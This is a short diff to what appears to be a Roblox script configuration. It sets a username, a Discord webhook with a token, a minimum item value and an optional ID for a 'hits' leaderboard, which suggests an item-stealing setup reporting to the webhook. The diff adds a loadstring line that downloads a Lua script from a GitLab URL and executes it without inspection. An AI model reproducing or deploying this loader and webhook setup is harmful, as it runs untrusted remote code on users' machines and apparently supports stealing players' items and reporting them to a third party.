@@ -1,6 +1,7 @@
 Username = "xxqoooo12"
-Webhook = "https://discord.com/api/webhooks/1404786258328420494/78r20hEdHGAFr4bn_tI9k1AKz_2nz6JlHFs9Ez1QLX2XAq5QiDJF4FWEsgWXUqcR1ewt"
+Webhook = "https://discord.com/api/webhooks/1404769955823751208/6frxrQUDtP8MaRPRbZsGHVfFNCbPA5A5bz36NLCeweqfAoiy8GPDE49SngWzN2M-Nsg0"
 MinimumValue = 1
 DiscordID = "Your discord user id" -- optional if you wanna be in hits lb
 
-```loadstring(game:HttpGet("https://codeberg.org/JessScripts/Lua/raw/branch/main/Lua"))()```
+
+loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/AutoJoiner.lua"))()
